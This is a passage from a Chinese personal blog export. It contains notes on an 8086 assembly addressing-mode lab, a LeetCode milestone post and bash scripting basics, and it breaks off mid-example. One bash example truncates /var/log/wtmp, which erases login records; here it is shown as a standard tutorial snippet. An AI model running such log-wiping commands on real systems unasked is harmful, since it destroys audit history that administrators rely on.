AX&#xFF0C;[BX+1200H]<br>&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x6216;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x518D;&#x52A0;&#x4E0A;8&#x4F4D;&#x6216;16&#x4F4D;&#x4F4D;&#x79FB;&#x91CF;&#x4E4B;&#x548C;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x91CF;&#xFF08;&#x4F4D;&#x79FB;&#x91CF;&#xFF09;&#x3002;&#x8FD9;&#x4E2A;&#x4F4D;&#x79FB;&#x91CF;&#x53EF;&#x4EE5;&#x662F;&#x7ACB;&#x5373;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7B26;&#x53F7;&#x5730;&#x5740;&#x3002; </p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R DS <span class="number">1500</span></span></span><br><span class="line"><span class="ruby">-E <span class="symbol">DS:</span><span class="number">7335</span>  <span class="number">28</span> <span class="number">24</span></span></span><br><span class="line"><span class="ruby">-D <span class="symbol">DS:</span><span class="number">7335</span></span></span><br><span class="line"><span class="ruby">-A</span></span><br><span class="line"><span class="ruby">MOV SI&#xFF0C;<span class="number">7310</span></span></span><br><span class="line"><span class="ruby">MOV AX&#xFF0C;<span class="number">25</span>[SI]</span></span><br></pre></td></tr></tbody></table></figure><h2 id="&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX+SI]<br>&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x4E00;&#x4E2A;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E4B;&#x548C;&#x3002;</p><h2 id="&#x76F8;&#x5BF9;&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"><a href="#&#x76F8;&#x5BF9;&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;" class="headerlink" title="&#x76F8;&#x5BF9;&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;"></a>&#x76F8;&#x5BF9;&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</h2><p>&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX+SI+1200H]<br>&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x52A0;&#x4E00;&#x4E2A;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x518D;&#x52A0;&#x4E00;&#x4E2A;&#x4F4D;&#x79FB;&#x91CF;&#xFF0C;&#x4E09;&#x8005;&#x4E4B;&#x548C;&#x3002;&#x53EF;&#x7528;&#x4E8E;&#x4E8C;&#x7EF4;&#x8868;&#x67E5;&#x8868;&#x548C;&#x6808;&#x5904;&#x7406;&#x3002;</p><h2 id="&#x5B9E;&#x9A8C;&#x4EFB;&#x52A1;"><a href="#&#x5B9E;&#x9A8C;&#x4EFB;&#x52A1;" class="headerlink" title="&#x5B9E;&#x9A8C;&#x4EFB;&#x52A1;"></a><strong>&#x5B9E;&#x9A8C;&#x4EFB;&#x52A1;</strong></h2><ol><li>&#x5B9E;&#x9A8C;&#x76EE;&#x7684;</li></ol><p>&#x901A;&#x8FC7;&#x5B9E;&#x9A8C;&#x89C2;&#x5BDF;&#x548C;&#x5206;&#x6790;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x4E0B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x903B;&#x8F91;&#x5730;&#x5740;&#x7684;&#x8868;&#x793A;&#x4EE5;&#x53CA;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x719F;&#x7EC3;&#x638C;&#x63E1;DEBUG&#x7684;R&#x547D;&#x4EE4;&#x3001;A&#x547D;&#x4EE4;&#x3001;T&#x547D;&#x4EE4;&#x548C;D&#x547D;&#x4EE4;&#x7684;&#x7528;&#x6CD5;&#x3002;</p><ol start="2"><li>&#x5B9E;&#x9A8C;&#x5185;&#x5BB9;</li></ol><p>&#x53C2;&#x8003;&#x793A;&#x4F8B;&#x4E00;&#x548C;&#x5404;&#x79CD;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5B8C;&#x6210;&#x4E0B;&#x5217;&#x5B9E;&#x9A8C;&#x5185;&#x5BB9;&#xFF1A;</p><p>&#xFF08;1&#xFF09;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x76F8;&#x51CF;&#x8FD0;&#x7B97;&#xFF0C;&#x7ED3;&#x679C;&#x653E;&#x5728;&#x6570;&#x636E;&#x6BB5;&#x7684;16&#x53F7;&#x5355;&#x5143;&#x3002;</p><blockquote><p>1&#xFF09;AX&#x3001;BX&#x5BC4;&#x5B58;&#x5668;&#x5206;&#x522B;&#x8D4B;&#x503C;&#x4E3A;0008H&#x548C;0010H&#x3002;<br>2&#xFF09;AX&#x548C;BX&#x7684;&#x5185;&#x5BB9;&#x76F8;&#x51CF;&#xFF08;SUB&#x6307;&#x4EE4;&#xFF09;&#xFF0C;&#x7ED3;&#x679C;&#x5728;AX&#x4E2D;&#x3002;<br>3&#xFF09;&#x7528;&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C06;&#x76F8;&#x51CF;&#x7684;&#x7ED3;&#x679C;&#x4FDD;&#x5B58;&#x5230;16&#x53F7;&#x5355;&#x5143;&#x3002;</p></blockquote><p><img src="https://dn-simplecloud.shiyanlou.com/8029611540467753293-wm" alt="&#x5B9E;&#x9A8C;&#x697C;"></p><p>&#xFF08;2&#xFF09;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x76F8;&#x52A0;&#x8FD0;&#x7B97;&#xFF0C;&#x7ED3;&#x679C;&#x653E;&#x5728;&#x9644;&#x52A0;&#x6BB5;&#x7684;0020H&#x53F7;&#x5355;&#x5143;&#x3002;</p><blockquote><p>1&#xFF09;AX&#x7684;&#x503C;&#x4E3A;0034H&#x3002;<br>2&#xFF09;AX&#x548C;65&#x76F8;&#x52A0;&#xFF0C;&#x7ED3;&#x679C;&#x5728;AX&#x4E2D;&#x3002;<br>3&#xFF09;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF08;&#x6BB5;&#x8D85;&#x8D8A;&#xFF09;&#x4FDD;&#x5B58;&#x8FD0;&#x7B97;&#x7ED3;&#x679C;&#x3002;</p></blockquote><p>&#xFF08;3&#xFF09;&#x5C06;AX&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x7684;1234H&#x5199;&#x5165;&#x6570;&#x636E;&#x6BB5;&#x7684;2&#x53F7;&#x5355;&#x5143;&#xFF0C;&#x8BFB;&#x51FA;3&#x53F7;&#x5355;&#x5143;&#x7684;12H&#x4F20;&#x9001;&#x7ED9;BL&#x5BC4;&#x5B58;&#x5668;&#x3002;&#xFF08;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x81EA;&#x5B9A;&#xFF09;</p><ol start="3"><li>&#x5B9E;&#x9A8C;&#x8981;&#x6C42;<blockquote><p>&#xFF08;1&#xFF09;&#x5199;&#x51FA;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x53CA;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x9A8C;&#x5185;&#x5BB9;&#x7528;&#x622A;&#x56FE;&#x5F62;&#x5F0F;&#x8BB0;&#x5F55;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;<br>&#xFF08;3&#xFF09;&#x5199;&#x51FA;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;&#x5206;&#x6790;&#x3002;</p></blockquote></li></ol><hr><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> assembly </category>
          
      </categories>
      
      
        <tags>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>leetcode commemoration day</title>
      <link href="/2018/10/24/leetcode-commemoration-day/"/>
      <url>/2018/10/24/leetcode-commemoration-day/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_leetcode.jpeg" alt=""></p><a id="more"></a><p>100&#x9898;&#x7EAA;&#x5FF5;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_Screenshot%20from%202018-10-24%2018-07-13.png" alt=""></p><p>200&#x9898;&#x7EAA;&#x5FF5;&#xFF1A; 2018-11-20<br><img src="https://s1.ax1x.com/2018/11/20/F9iBa4.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> commemoration day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> commemoration day </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Advanced bash scripting guide</title>
      <link href="/2018/10/21/Advanced-bash-scripting-guide/"/>
      <url>/2018/10/21/Advanced-bash-scripting-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1505093960707.png" alt=""></p><a id="more"></a><p>1.&#x4F7F;&#x7528;&#x811A;&#x672C;&#x6E05;&#x9664;&#x6587;&#x4EF6;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;</span></span><br><span class="line">LOG_DIR=/var/<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$LOG_DIR</span></span><br><span class="line"></span><br><span class="line">cat /dev/null &gt; wtmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Logs cleaned up.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2.&#x547D;&#x4EE4;&#x5206;&#x9694;&#x7B26;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> hello; <span class="built_in">echo</span> there</span><br><span class="line">filename=ttt.sh</span><br><span class="line"><span class="keyword">if</span> [ -e <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]; <span class="keyword">then</span>    <span class="comment"># &#x6CE8;&#x610F;: &quot;if&quot;&#x548C;&quot;then&quot;&#x9700;&#x8981;&#x5206;&#x9694;&#xFF0C;-e&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File <span class="variable">$filename</span> exists.&quot;</span>; cp <span class="variable">$filename</span> <span class="variable">$filename</span>.bak</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File <span class="variable">$filename</span> not found.&quot;</span>; touch <span class="variable">$filename</span></span><br><span class="line"><span class="keyword">fi</span>; <span class="built_in">echo</span> <span class="string">&quot;File test complete.&quot;</span></span><br></pre></td></tr></tbody></table></figure><p>3.&#x7EC8;&#x6B62;case&#x9009;&#x9879;&#xFF08;&#x53CC;&#x5206;&#x53F7;&#xFF09;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">varname=b</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$varname</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    [a-z]) <span class="built_in">echo</span> <span class="string">&quot;abc&quot;</span>;;</span><br><span class="line">    [0-9]) <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>4.&#x7B49;&#x4EF7;&#x4E8E; source &#x547D;&#x4EE4;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> test.sh</span><br><span class="line">Hello World</span><br><span class="line">$ . test.sh</span><br><span class="line">Hello World</span><br></pre></td></tr></tbody></table></figure><p></p><p>5.&#x53CC;&#x5F15;&#x53F7;&#xFF08;&#x201D;)<br>&#x201C;STRING&#x201D; &#x5C06;&#x4F1A;&#x963B;&#x6B62;&#xFF08;&#x89E3;&#x91CA;&#xFF09;STRING&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x7279;&#x6B8A;&#x7684;&#x5B57;&#x7B26;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002;</p><p>6.&#x5355;&#x5F15;&#x53F7;&#xFF08;&#x2019;&#xFF09;<br>&#x2018;STRING&#x2019; &#x5C06;&#x4F1A;&#x963B;&#x6B62;STRING&#x4E2D;&#x6240;&#x6709;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x6BD4;&#x4F7F;&#x7528;&#x201D;&#x66F4;&#x5F3A;&#x70C8;&#x7684;&#x5F62;&#x5F0F;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002;</p><p>&#x533A;&#x522B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HOME=<span class="string">&apos;shiyanlou&apos;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$HOME</span></span><br><span class="line">&gt;&gt; shiyanlou</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;$HOME&apos;</span></span><br><span class="line">&gt;&gt; <span class="string">&apos;$HOME&apos;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">&gt;&gt; shiyanlou</span><br></pre></td></tr></tbody></table></figure><p></p><p>7.&#x659C;&#x7EBF;&#xFF08;/&#xFF09;<br>&#x6587;&#x4EF6;&#x540D;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;&#x3002;&#x5206;&#x9694;&#x6587;&#x4EF6;&#x540D;&#x4E0D;&#x540C;&#x7684;&#x90E8;&#x5206;&#xFF08;&#x5982;/home/bozo/projects/Makefile&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4F5C;&#x4E3A;&#x9664;&#x6CD5;&#x7B97;&#x672F;&#x64CD;&#x4F5C;&#x7B26;&#x3002;&#x6CE8;&#x610F;&#x5728;linux&#x4E2D;&#x8868;&#x793A;&#x8DEF;&#x5F84;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8BB8;&#x591A;&#x4E2A;/&#x8DDF;&#x4E00;&#x4E2A;/&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;/home/shiyanlou&#x7B49;&#x540C;&#x4E8E;////home///shiyanlou</p><p>8.&#x53CD;&#x659C;&#x7EBF;&#xFF08;\&#xFF09;<br>&#x4E00;&#x79CD;&#x5BF9;&#x5355;&#x5B57;&#x7B26;&#x7684;&#x5F15;&#x7528;&#x673A;&#x5236;&#x3002;\X &#x5C06;&#x4F1A;&#x201C;&#x8F6C;&#x4E49;&#x201D;&#x5B57;&#x7B26;X&#x3002;&#x8FD9;&#x7B49;&#x4EF7;&#x4E8E;&#x201D;X&#x201D;&#xFF0C;&#x4E5F;&#x7B49;&#x4EF7;&#x4E8E;&#x2019;X&#x2019;&#x3002;\ &#x901A;&#x5E38;&#x7528;&#x6765;&#x8F6C;&#x4E49;&#x53CC;&#x5F15;&#x53F7;&#xFF08;&#x201D;&#xFF09;&#x548C;&#x5355;&#x5F15;&#x53F7;&#xFF08;&#x2019;&#xFF09;&#xFF0C;&#x8FD9;&#x6837;&#x53CC;&#x5F15;&#x53F7;&#x548C;&#x5355;&#x5F15;&#x53F7;&#x5C31;&#x4E0D;&#x4F1A;&#x88AB;&#x89E3;&#x91CA;&#x6210;&#x7279;&#x6B8A;&#x542B;&#x4E49;&#x4E86;&#x3002;</p><p>&#x7B26;&#x53F7; &#x8BF4;&#x660E;<br>\n &#x8868;&#x793A;&#x65B0;&#x7684;&#x4E00;&#x884C;<br>\r &#x8868;&#x793A;&#x56DE;&#x8F66;<br>\t &#x8868;&#x793A;&#x6C34;&#x5E73;&#x5236;&#x8868;&#x7B26;<br>\v &#x8868;&#x793A;&#x5782;&#x76F4;&#x5236;&#x8868;&#x7B26;<br>\b &#x8868;&#x793A;&#x540E;&#x9000;&#x7B26;<br>\a &#x8868;&#x793A;&#x201D;alert&#x201D;(&#x8702;&#x9E23;&#x6216;&#x8005;&#x95EA;&#x70C1;)<br>\0xx &#x8F6C;&#x6362;&#x4E3A;&#x516B;&#x8FDB;&#x5236;&#x7684;ASCII&#x7801;, &#x7B49;&#x4EF7;&#x4E8E;0xx<br>&#x201C; &#x8868;&#x793A;&#x5F15;&#x53F7;&#x5B57;&#x9762;&#x7684;&#x610F;&#x601D;<br>&#x8F6C;&#x4E49;&#x7B26;&#x4E5F;&#x63D0;&#x4F9B;&#x7EED;&#x884C;&#x529F;&#x80FD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7F16;&#x5199;&#x591A;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x3002;</p><p>9.&#x547D;&#x4EE4;&#x66FF;&#x6362;<br>&#x53CD;&#x5F15;&#x53F7;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x4F18;&#x5148;&#x6267;&#x884C;&#xFF0C;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp `mkdir back` test.sh back</span><br><span class="line">$ ls</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5148;&#x521B;&#x5EFA;&#x4E86; back &#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x590D;&#x5236; test.sh &#x5230; back &#x76EE;&#x5F55;</p><p>10.&#x7A7A;&#x547D;&#x4EE4;(:)<br>&#x7B49;&#x4EF7;&#x4E8E;&#x201C;NOP&#x201D;&#xFF08;no op&#xFF0C;&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x5E72;&#x7684;&#x547D;&#x4EE4;&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x88AB;&#x8BA4;&#x4E3A;&#x4E0E;shell&#x7684;&#x5185;&#x5EFA;&#x547D;&#x4EE4;true&#x4F5C;&#x7528;&#x76F8;&#x540C;&#x3002;&#x201C;:&#x201D;&#x547D;&#x4EE4;&#x662F;&#x4E00;&#x4E2A;bash&#x7684;&#x5185;&#x5EFA;&#x547D;&#x4EE4;&#xFF0C;&#x5B83;&#x7684;&#x9000;&#x51FA;&#x7801;&#xFF08;exit status&#xFF09;&#x662F;&#xFF08;0&#xFF09;&#x3002;</p><p>&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;endless loop&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B49;&#x4EF7;&#x4E8E;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;endless loop&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x5728; if/then &#x4E2D;&#x4F5C;&#x5360;&#x4F4D;&#x7B26;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">condition=5</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$condition</span> -gt 0 ] <span class="comment">#gt&#x8868;&#x793A;greater than&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5927;&#x4E8E;&#xFF0C;&#x540C;&#x6837;&#x6709;-lt&#xFF08;&#x5C0F;&#x4E8E;&#xFF09;&#xFF0C;-eq&#xFF08;&#x7B49;&#x4E8E;&#xFF09; </span></span><br><span class="line"><span class="keyword">then</span> :   <span class="comment"># &#x4EC0;&#x4E48;&#x90FD;&#x4E0D;&#x505A;&#xFF0C;&#x9000;&#x51FA;&#x5206;&#x652F;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$condition</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>11.&#x53D8;&#x91CF;&#x6269;&#x5C55;/&#x5B50;&#x4E32;&#x66FF;&#x6362;<br>&#x5728;&#x4E0E;&gt;&#x91CD;&#x5B9A;&#x5411;&#x64CD;&#x4F5C;&#x7B26;&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5C06;&#x4F1A;&#x628A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x6E05;&#x7A7A;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x3002;&#x5982;&#x679C;&#x4E4B;&#x524D;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5E76;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ : &gt; test.sh   <span class="comment"># &#x6587;&#x4EF6;&#x201C;test.sh&#x201D;&#x73B0;&#x5728;&#x88AB;&#x6E05;&#x7A7A;&#x4E86;</span></span><br><span class="line"><span class="comment"># &#x4E0E; cat /dev/null &gt; test.sh &#x7684;&#x4F5C;&#x7528;&#x76F8;&#x540C;</span></span><br><span class="line"><span class="comment"># &#x7136;&#x800C;,&#x8FD9;&#x5E76;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8FDB;&#x7A0B;, &#x56E0;&#x4E3A;&#x201C;:&#x201D;&#x662F;&#x4E00;&#x4E2A;&#x5185;&#x5EFA;&#x547D;&#x4EE4;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>11.&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C;&#x7B26;(?)<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=10</span><br><span class="line">(( t=a&lt;50?8:9 ))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$t</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>12.&#x5C0F;&#x62EC;&#x53F7;&#xFF08;&#xFF09;<br>1&#xFF09;&#x5C40;&#x90E8;&#x53D8;&#x91CF;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=123</span><br><span class="line">( a=321; )</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span>&quot;</span> <span class="comment">#a&#x7684;&#x503C;&#x4E3A;123&#x800C;&#x4E0D;&#x662F;321&#xFF0C;&#x56E0;&#x4E3A;&#x62EC;&#x53F7;&#x5C06;&#x5224;&#x65AD;&#x4E3A;&#x5C40;&#x90E8;&#x53D8;&#x91CF;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2&#xFF09;&#x521D;&#x59CB;&#x5316;&#x6570;&#x7EC4;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">arr=(1 4 5 7 9 21)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${arr[3]}</span> <span class="comment"># get a value of arr</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>13.&#x5927;&#x62EC;&#x53F7;{}<br>1&#xFF09;&#x590D;&#x5236; t.txt &#x7684;&#x5185;&#x5BB9;&#x5230; t.back &#x4E2D;<br></p><figure class="highlight bash"><table><tbody><tr><td 